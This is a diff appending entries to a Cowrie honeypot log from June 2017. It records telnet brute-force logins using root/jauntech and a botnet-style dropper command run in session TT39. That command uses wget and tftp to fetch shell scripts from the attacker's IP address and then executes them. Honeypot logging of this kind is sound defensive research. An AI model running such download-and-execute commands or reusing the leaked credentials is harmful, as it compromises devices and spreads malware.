@@ -5359,3 +5359,41 @@
 2017-06-16T19:17:24+0000 [CowrieTelnetTransport,37,216.120.247.147] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-06-16T19:17:24+0000 [CowrieTelnetTransport,37,216.120.247.147] Connection lost after 133 seconds
+2017-06-16T19:18:03+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.125.230.50:54721 (10.8.41.81:2223) [session: TT39]
+2017-06-16T19:18:04+0000 [CowrieTelnetTransport,39,185.125.230.50] first time for 185.125.230.50, need: 1
+2017-06-16T19:18:04+0000 [CowrieTelnetTransport,39,185.125.230.50] login attempt: 1
+2017-06-16T19:18:06+0000 [CowrieTelnetTransport,39,185.125.230.50] login attempt [root/jauntech] succeeded
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] Opening TTY Log: log/tty/20170616-191808-None-39i.log
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] Warning: state changed and new state returned
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] CMD: sh
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] Command found: sh 
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] CMD: busybox wget || wget http://http://185.125.230.50/wbin.sh; busybox tftp || tftp -g -r 185.125.230.50 tbin1.sh; sh tbin1.sh || sh wbin.sh *
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] Command found: busybox wget
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] Command found: wget
+2017-06-16T19:18:08+0000 [CowrieTelnetTransport,39,185.125.230.50] Command found: wget http://http://185.125.230.50/wbin.sh
+2017-06-16T19:18:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://http://185.125.230.50/wbin.sh>
+2017-06-16T19:18:08+0000 [-] Command found: busybox tftp
+2017-06-16T19:18:08+0000 [-] Command found: tftp
+2017-06-16T19:18:08+0000 [-] Command found: tftp -g -r 185.125.230.50 tbin1.sh
+2017-06-16T19:18:08+0000 [-] Command found: sh tbin1.sh
+2017-06-16T19:18:08+0000 [-] Command found: sh wbin.sh /root/.profile /root/.ssh /root/.aptitude /root/.bashrc
+2017-06-16T19:18:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://http://185.125.230.50/wbin.sh>
+2017-06-16T19:18:23+0000 [CowrieTelnetTransport,39,185.125.230.50] Closing TTY Log: log/tty/20170616-191808-None-39i.log after 14 seconds
+2017-06-16T19:18:23+0000 [CowrieTelnetTransport,39,185.125.230.50] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-16T19:18:23+0000 [CowrieTelnetTransport,39,185.125.230.50] Connection lost after 19 seconds
+2017-06-16T19:18:24+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:26142 (10.8.41.81:2222) [session: ab978a45]
+2017-06-16T19:18:26+0000 [HoneyPotSSHTransport,23,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-16T19:18:26+0000 [HoneyPotSSHTransport,23,113.195.145.52] connection lost
+2017-06-16T19:18:26+0000 [HoneyPotSSHTransport,23,113.195.145.52] Connection lost after 2 seconds
+2017-06-16T19:18:31+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.125.230.50:56524 (10.8.41.81:2223) [session: TT40]
+2017-06-16T19:18:32+0000 [CowrieTelnetTransport,40,185.125.230.50] login attempt: 2
+2017-06-16T19:18:32+0000 [CowrieTelnetTransport,40,185.125.230.50] login return, expect: [root/jauntech]
+2017-06-16T19:18:35+0000 [CowrieTelnetTransport,40,185.125.230.50] login attempt [root/jauntech] succeeded
+2017-06-16T19:18:36+0000 [CowrieTelnetTransport,40,185.125.230.50] Opening TTY Log: log/tty/20170616-191836-None-40i.log
+2017-06-16T19:18:36+0000 [CowrieTelnetTransport,40,185.125.230.50] Warning: state changed and new state returned
+2017-06-16T19:18:36+0000 [CowrieTelnetTransport,40,185.125.230.50] Closing TTY Log: log/tty/20170616-191836-None-40i.log after 0 seconds
+2017-06-16T19:18:36+0000 [CowrieTelnetTransport,40,185.125.230.50] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-16T19:18:36+0000 [CowrieTelnetTransport,40,185.125.230.50] Connection lost after 4 seconds
